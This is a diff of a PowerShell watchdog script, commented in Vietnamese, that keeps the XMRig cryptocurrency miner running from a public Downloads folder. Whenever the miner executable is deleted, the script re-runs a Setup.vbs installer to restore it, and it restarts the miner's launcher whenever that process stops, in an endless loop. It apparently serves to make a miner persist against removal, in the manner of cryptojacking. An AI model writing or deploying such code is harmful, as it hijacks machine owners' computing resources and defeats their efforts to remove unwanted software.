@@ -2,78 +2,66 @@ $xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
 
-function Start-CoinRun {
-    # Dừng tiến trình cũ nếu còn đang chạy
-    if ($global:coinRunProcess -and !$global:coinRunProcess.HasExited) {
-        try {
-            $global:coinRunProcess.Kill()
-            Write-Host "STOP"
-        } catch {
-            Write-Warning "DO NOT"
-        }
-    }
-
-    # Bắt đầu lại tiến trình mới
-    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
-    Write-Host "🚀 coinrun.cmd START"
+function Is-XmrigRunning {
+    return (Get-Process | Where-Object { $_.Path -eq $xmrigPath }) -ne $null
 }
 
+function Start-CoinRun {
+    if (Is-XmrigRunning) {
+        Write-Host "xmrig.exe đã chạy. Không khởi chạy lại."
+        return
+    }
+
+    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
+    Write-Host "Đã khởi chạy coinrun.cmd"
+}
+
+# Lần đầu khởi chạy
 if (Test-Path $xmrigPath) {
     Start-CoinRun
 } else {
-    Write-Warning "xmrig.exe DoseNotExist..."
+    Write-Warning "xmrig.exe không tồn tại. Đang chạy Setup.vbs..."
     if (Test-Path $setupPath) {
         Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
-        Write-Host "Running Setup.vbs"
+        Write-Host "Đã chạy Setup.vbs"
 
         while (!(Test-Path $xmrigPath)) {
-            Write-Host "Wait xmrig.exe..."
+            Write-Host "Đang chờ xmrig.exe xuất hiện..."
             Start-Sleep -Seconds 3
         }
 
-        Write-Host "xmrig.exe restored. Starting coinrun.cmd"
-        Start-CoinRun  # <== BỔ SUNG GỌI LẠI SAU KHI KHÔI PHỤC
+        Start-CoinRun
     } else {
-        Write-Error "NO Setup.vbs"
+        Write-Error "Không tìm thấy Setup.vbs"
     }
 }
 
+# Vòng lặp giám sát
 while ($true) {
     if (!(Test-Path $xmrigPath)) {
-        Write-Warning "xmrig.exe deleted. Waiting..."
+        Write-Warning "xmrig.exe bị xóa. Đang chạy lại Setup.vbs..."
 
         if (Test-Path $setupPath) {
             Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
-            Write-Host "Running Setup.vbs!"
+            Write-Host "Đã chạy lại Setup.vbs"
 
             while (!(Test-Path $xmrigPath)) {
-                Write-Host "Waiting... xmrig.exe"
+                Write-Host "Đang chờ xmrig.exe xuất hiện lại..."
                 Start-Sleep -Seconds 3
             }
 
-            Write-Host "xmrig.exe restored. Restarting coinrun.cmd"
-
-            # Trước khi chạy lại coinrun.cmd, kết thúc tiến trình cũ nếu còn
-            if ($global:coinRunProcess -and !$global:coinRunProcess.HasExited) {
-                try {
-                    $global:coinRunProcess.Kill()
-                    Write-Host "Đã dừng tiến trình cũ coinrun.cmd"
-                } catch {
-                    Write-Warning "Không thể dừng tiến trình cũ"
-                }
-            }
-
-            Start-CoinRun  # <== BỔ SUNG GỌI LẠI SAU KHI KHÔI PHỤC
+            Start-CoinRun
         } else {
-            Write-Error "NO Setup.vbs: $setupPath"
+            Write-Error "Không tìm thấy Setup.vbs tại $setupPath"
         }
     }
 
+    # Nếu tiến trình coinrun bị tắt (do lỗi) → khởi động lại nếu chưa có xmrig.exe chạy
     if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
-        Write-Warning "coinrun.cmd STOPPED. Restarting..."
+        Write-Warning "coinrun.cmd STOPPED. Checking xmrig status..."
         Start-CoinRun
     } elseif ($global:coinRunProcess) {
-        Write-Host "coinrun.cmd running..."
+        Write-Host "coinrun.cmd vẫn đang chạy..."
     }
 
     Start-Sleep -Seconds 3
